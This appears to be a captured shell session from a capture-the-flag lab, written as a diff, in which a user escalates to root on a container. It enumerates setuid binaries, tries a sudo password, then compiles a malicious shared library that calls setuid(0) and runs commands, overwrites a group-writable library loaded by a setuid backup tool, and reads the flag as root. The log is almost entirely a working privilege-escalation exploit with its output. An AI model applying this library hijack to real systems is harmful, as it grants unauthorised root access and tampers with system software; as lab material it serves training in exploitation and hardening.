@@ -1,0 +1,63 @@
+$ id
+uid=1001(player) gid=1001(player) groups=1001(player),996(ops)
+
+$ find / -perm -4000 -type f 2>/dev/null | grep backup
+/opt/backup/bin/backup-tool
+
+$ ls -ld /opt/backup/lib /opt/backup/bin; ls -l /opt/backup/bin/backup-tool /opt/backup/lib/libbackup.so
+drwxr-xr-x 1 root root 4096 Nov 19 00:10 /opt/backup/bin
+drwxrwsr-x 1 root ops  4096 Nov 19 00:10 /opt/backup/lib
+-rwsr-xr-x 1 root root 16096 Nov 19 00:10 /opt/backup/bin/backup-tool
+-rw-rw-r-- 1 root ops  15552 Nov 19 00:10 /opt/backup/lib/libbackup.so
+
+$ /opt/backup/bin/backup-tool
+[backup-tool] starting backup as uid=1001 euid=0
+[libbackup] performing nightly backup
+[backup-tool] result: 0
+
+$ readelf -d /opt/backup/bin/backup-tool | grep -Ei 'rpath|runpath'
+ 0x000000000000001d (RUNPATH)            Library runpath: [/opt/backup/lib]
+
+$ ldd /opt/backup/bin/backup-tool
+	linux-vdso.so.1 (0x000070c1425d8000)
+	libbackup.so => /opt/backup/lib/libbackup.so (0x000070c1425c6000)
+	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x000070c1423b0000)
+	/lib64/ld-linux-x86-64.so.2 (0x000070c1425da000)
+
+$ cat /flag.txt
+cat: /flag.txt: Permission denied
+
+$ printf 'Player@2026\n' | sudo -S -k -l
+[sudo] password for player: Sorry, user player may not run sudo on 9bba8201fa39.
+
+$ echo x >> /opt/backup/bin/backup-tool
+bash: line 1: /opt/backup/bin/backup-tool: Permission denied
+
+$ cat > /tmp/evil.c <<'EOF'
+#include <stdlib.h>
+#include <unistd.h>
+int backup_run(void) { setuid(0); setgid(0); system("id; cat /flag.txt"); return 0; }
+EOF
+gcc -shared -fPIC -o /tmp/libbackup.so /tmp/evil.c && ls -l /tmp/libbackup.so
+-rwxrwxr-x 1 player player 15656 Nov 19 00:22 /tmp/libbackup.so
+
+$ LD_PRELOAD=/tmp/libbackup.so /opt/backup/bin/backup-tool
+[backup-tool] starting backup as uid=1001 euid=0
+[libbackup] performing nightly backup
+[backup-tool] result: 0
+
+$ LD_LIBRARY_PATH=/tmp /opt/backup/bin/backup-tool
+[backup-tool] starting backup as uid=1001 euid=0
+[libbackup] performing nightly backup
+[backup-tool] result: 0
+
+$ cp /tmp/libbackup.so /opt/backup/lib/libbackup.so && ls -l /opt/backup/lib/
+total 16
+-rw-rw-r-- 1 root ops 15656 Nov 19 00:22 libbackup.so
+
+$ /opt/backup/bin/backup-tool
+uid=0(root) gid=0(root) groups=0(root),996(ops),1001(player)
+Ly_Flag{ldtu2xb7}
+[backup-tool] starting backup as uid=1001 euid=0
+[backup-tool] result: 0
+
